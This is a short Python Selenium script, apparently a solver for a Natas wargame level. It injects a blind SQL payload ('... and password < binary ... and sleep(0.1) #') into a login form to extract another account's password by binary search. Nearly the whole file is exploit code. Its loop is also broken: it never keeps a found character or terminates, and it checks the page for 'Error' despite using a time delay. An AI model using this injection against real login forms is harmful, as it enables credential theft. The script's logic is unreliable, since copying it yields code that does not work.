from common import *
import string

def solve(driver, _ = None):
    

    language = string.ascii_lowercase+string.digits
    password = ""
    
    while True:                                                 # because we don't know the length of the password (it's 34, but maybe it's not in the future)
        # binary search
        low = 0
        high = len(language)-1
        while low <= high:
            mid = (low+high)//2
            password = password + language[mid]
            driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(
                f'natas18" and password < binary "{password}" and sleep(0.1) # '
            )
            driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
            if "Error" in driver.page_source:
                high = mid-1
            else:
                low = mid+1
            password = password[:-1]
    
    
    driver.get(build_url(password = password, level=16))
    return password